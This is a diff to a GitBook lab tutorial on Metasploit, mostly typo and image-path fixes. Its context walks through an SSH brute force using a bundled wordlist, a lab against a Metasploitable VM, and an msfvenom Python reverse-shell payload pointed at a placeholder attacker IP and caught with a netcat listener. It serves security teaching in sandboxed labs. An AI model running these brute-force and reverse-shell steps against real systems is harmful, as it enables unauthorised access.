@@ -164,7 +164,7 @@ For this part of the lab, we will carry out a few exploits using the Metasploit 
 First, you may need to update it to the latest version.
 
 ```
-sudo apt update -y; sudo apt install Metasploit-framework -y
+sudo apt update -y; sudo apt install metasploit-framework -y
 ```
 
 From the nmap scan above, we have discovered the IP address of our target (metasploitable VM) machine and the services running. The first one we will exploit is the one at the top at port 21 - the FTP service.
@@ -269,14 +269,14 @@ show options
 Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.
 
 ```
-set USERPASS_FILE = /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
+set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
 ```
 
-![](../.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (9) (3) (1).png>)
 
 At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:
 
-![](<../.gitbook/assets/image (1) (1).png>)
+![](<../.gitbook/assets/image (1) (1) (2).png>)
 
 {% hint style="info" %}
 You would notice that this is SSH session 3, meaning I did find two other credentials that could be used to SSH to the metasploitable VM. Which ones do you think they are?
@@ -326,12 +326,12 @@ The Metasploit also comes with tools to create vulnerable executable scripts/fil
 msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
 ```
 
-![](<../.gitbook/assets/image (3) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (2).png>)
 
 The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.
 
 {% hint style="info" %}
-For this exercise, I just cloned by Kali VM and used as the target. You can do similar, or run an existing VM and test also (should work on any OS).
+For this exercise, I just cloned my Kali VM and used it as the target. You can do similar, or run an existing VM and test also (should work on any OS).
 {% endhint %}
 
 But before you run the script (it will fail as you would have found out), you must first listen for activities from your attacker machine:
@@ -340,7 +340,7 @@ But before you run the script (it will fail as you would have found out), you mu
 nc -lvnp 443
 ```
 
-We set 443 to be the incoming port from the target host, so we listen on this port and wait until the target host executes the script. So now, let's execute the script from the target host:
+We set 443 to be the incoming port from the target host, so we listen on this port and wait until the target host executes the script. If this port isn't working for you, you can try a different port e.g., 4444. So now, let's execute the script from the target host:
 
 ```
 python -c "[copy and paste payload here]"
@@ -349,10 +349,10 @@ python -c "[copy and paste payload here]"
 ![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
 {% hint style="info" %}
-Usually the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
+Usually, the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
 {% endhint %}
 
-The above example would be considered _malware_. The msfvenom can be used to create various payloads to do malicious tasks so have a look at its library and explore (please do NOT use them other than on your own sandboxed/virtualised environments)!
+The above example would be considered _malware_. The `msfvenom` can be used to create various payloads to do malicious tasks so have a look at its library and explore (please do NOT use them other than on your own sandboxed/virtualised environments)!
 
 ### 1.3.4. Write our own Reverse Shell
 
@@ -372,7 +372,7 @@ Let's test it first, we have to update the attacker's IP address in the `victim.
 
 Once done, we can now compile the c codes using the makefile provided (if you have binaries in the zip, delete them and recompile).
 
-![](<../.gitbook/assets/image (1).png>)
+![](<../.gitbook/assets/image (1) (2).png>)
 
 We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).
 
